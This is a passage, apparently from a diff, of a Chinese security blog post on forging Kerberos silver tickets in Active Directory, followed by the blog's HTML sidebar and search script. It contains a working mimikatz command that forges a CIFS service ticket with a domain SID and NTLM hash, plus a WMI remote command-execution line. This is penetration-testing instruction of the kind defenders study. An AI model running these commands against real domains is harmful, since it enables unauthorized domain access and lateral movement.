+<h5 id="白银票据证连接到具有管理员权限Windows计算机上的WMI"><a href="#白银票据证连接到具有管理员权限Windows计算机上的WMI" class="headerlink" title="白银票据证连接到具有管理员权限Windows计算机上的WMI"></a>白银票据证连接到具有管理员权限Windows计算机上的WMI</h5><p> 为“ HOST ”服务和“ rpcss ”服务创建白银票据以使用WMI在目标系统上远程执行命令。</p>
+<p>注入这些白银票据之后，我们可以通过运行“klist”来确认Kerberos TGS票据在内存中注入白银票据后，我们可以通过“传票”来调用WMIC或Invoke-WmiMethod在目标系统上运行命令。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> win32_process <span class="literal">-ComputerName</span> <span class="variable">$</span> Computer <span class="literal">-Credential</span> <span class="variable">$</span> Creds <span class="literal">-name</span> create <span class="literal">-argumentlist</span>“<span class="variable">$</span> RunCommand”</span><br></pre></td></tr></table></figure>
+
+<h5 id="访问域控上“cifs”服务实列"><a href="#访问域控上“cifs”服务实列" class="headerlink" title="访问域控上“cifs”服务实列"></a>访问域控上“cifs”服务实列</h5><p>首先需要获得如下信息：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">domain</span><br><span class="line"><span class="string">/sid</span></span><br><span class="line"><span class="string">/target</span>:目标服务器的域名全称，此处为域控的全称</span><br><span class="line"><span class="string">/service</span>：目标服务器上面的kerberos服务，此处为cifs</span><br><span class="line"><span class="string">/rc4</span>：计算机账户的NTLM hash，域控主机的计算机账户</span><br><span class="line"><span class="string">/user</span>：要伪造的用户名，此处可用silver测试</span><br></pre></td></tr></table></figure>
+
+<p>使用mimikatz执行如下命令导入Silver Ticket</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz "kerberos::golden /domain:test.local /sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-4155807533</span><span class="string">-921486164</span><span class="string">-2767329826</span> /target:WIN<span class="string">-8</span>VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt"</span><br></pre></td></tr></table></figure>
+
+<p>此时可以成功访问域控上的文件共享</p>
+<h4 id="关于黄金票据和白银票据的一些区别"><a href="#关于黄金票据和白银票据的一些区别" class="headerlink" title="关于黄金票据和白银票据的一些区别:"></a>关于黄金票据和白银票据的一些区别:</h4><h5 id="1-访问权限不同"><a href="#1-访问权限不同" class="headerlink" title="1.访问权限不同"></a>1.访问权限不同</h5><ul>
+<li>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li>
+<li>Silver Ticket: 伪造TGS,只能访问指定的服务</li>
+</ul>
+<p><strong>2.加密方式不同</strong></p>
+<ul>
+<li>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li>
+<li>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li>
+</ul>
+<h5 id="3-认证流程不同"><a href="#3-认证流程不同" class="headerlink" title="3.认证流程不同"></a>3.认证流程不同</h5><ul>
+<li>Golden Ticket 的利用过程需要访问域控(KDC)</li>
+<li>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li>
+</ul>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p>[<a href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html]" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html]</a>(<a href="https://wooyun.js.org/drops/域渗透——Pass" target="_blank" rel="noopener">https://wooyun.js.org/drops/域渗透——Pass</a> The Ticket.html)</p>
+<p><a href="http://www.test666.me/archives/264/" target="_blank" rel="noopener">http://www.test666.me/archives/264/</a></p>
+<p><a href="https://uknowsec.cn/posts/notes/域渗透-Ticket.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.html</a></p>
+<p><a href="https://wh0ale.github.io/2018/12/25/2018-12-25-域渗透之票据/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/25/2018-12-25-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E7%A5%A8%E6%8D%AE/</a></p>
+<p><a href="http://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/" target="_blank" rel="noopener">http://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/</a></p>
+<h5 id=""><a href="#" class="headerlink" title=""></a></h5>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E7%A5%A8%E6%8D%AE/" rel="tag"># 票据</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/05/yu-shen-tou-zhi-ntml-hash/" rel="next" title="域渗透之NTML hash">
+                <i class="fa fa-chevron-left"></i> 域渗透之NTML hash
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/header.jpg"
+                alt="Shu1L" />
+            
+              <p class="site-author-name" itemprop="name">Shu1L</p>
+              <p class="site-description motion-element" itemprop="description">欢迎来到Shu1L的神秘小屋！</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">47</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="http://xun9er.com/" target="_blank" title="xun9er">
+                      
+                        <i class="fa fa-fw fa-globe"></i>xun9er</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://106.15.121.121/" target="_blank" title="ttpfx">
+                      
+                        <i class="fa fa-fw fa-globe"></i>ttpfx</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.cnblogs.com/lyxf/" target="_blank" title="l0gan">
+                      
+                        <i class="fa fa-fw fa-globe"></i>l0gan</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://www.mythe.top/" target="_blank" title="mythe">
+                      
+                        <i class="fa fa-fw fa-globe"></i>mythe</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://cyzcc.vip/" target="_blank" title="cyzCc">
+                      
+                        <i class="fa fa-fw fa-globe"></i>cyzCc</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.d0g3.cn/" target="_blank" title="道格安全研究实验室">
+                      
+                        <i class="fa fa-fw fa-globe"></i>道格安全研究实验室</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#浅析黄金票据与白银票据"><span class="nav-number">1.</span> <span class="nav-text">浅析黄金票据与白银票据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#概念"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">概念</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#金票-GoldenTicket"><span class="nav-number">1.2.</span> <span class="nav-text">(金票)GoldenTicket</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简介"><span class="nav-number">1.2.1.</span> <span class="nav-text">简介</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#黄金票据特点"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">黄金票据特点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#制作金票的条件："><span class="nav-number">1.2.1.2.</span> <span class="nav-text">制作金票的条件：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用步骤"><span class="nav-number">1.2.2.</span> <span class="nav-text">利用步骤:</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-导出krbtgt的Hash"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">1.导出krbtgt的Hash</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-生成Golden-Ticket"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">2.生成Golden Ticket</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-导入伪造Golden-Ticket获得域控权限"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">3.  导入伪造Golden Ticket获得域控权限</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#注意"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">注意</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#黄金票据防御"><span class="nav-number">1.2.3.</span> <span class="nav-text">黄金票据防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#银票-SilverTickets"><span class="nav-number">1.3.</span> <span class="nav-text">(银票)SilverTickets</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简介-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">简介</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#白银票据的特点"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">白银票据的特点</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用过程"><span class="nav-number">1.3.2.</span> <span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-获取hash-sid等信息"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">1.获取hash sid等信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-伪造白银票据"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">2.伪造白银票据</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#各种服务中的示例"><span class="nav-number">1.3.3.</span> <span class="nav-text">各种服务中的示例</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows共享（CIFS）管理访问的银票"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">Windows共享（CIFS）管理访问的银票</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#具有管理员权限的Windows计算机（HOST）白银票据"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">具有管理员权限的Windows计算机（HOST）白银票据</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Silver-Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行"><span class="nav-number">1.3.3.3.</span> <span class="nav-text">Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#白银票据证连接到具有管理员权限Windows计算机上的LDAP"><span class="nav-number">1.3.3.4.</span> <span class="nav-text">白银票据证连接到具有管理员权限Windows计算机上的LDAP</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#白银票据证连接到具有管理员权限Windows计算机上的WMI"><span class="nav-number">1.3.3.5.</span> <span class="nav-text">白银票据证连接到具有管理员权限Windows计算机上的WMI</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#访问域控上“cifs”服务实列"><span class="nav-number">1.3.3.6.</span> <span class="nav-text">访问域控上“cifs”服务实列</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#关于黄金票据和白银票据的一些区别"><span class="nav-number">1.3.4.</span> <span class="nav-text">关于黄金票据和白银票据的一些区别:</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-访问权限不同"><span class="nav-number">1.3.4.1.</span> <span class="nav-text">1.访问权限不同</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-认证流程不同"><span class="nav-number">1.3.4.2.</span> <span class="nav-text">3.认证流程不同</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考文章"><span class="nav-number">1.3.5.</span> <span class="nav-text">参考文章</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#null"><span class="nav-number">1.3.5.1.</span> <span class="nav-text"></span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shu1L</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three-waves.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
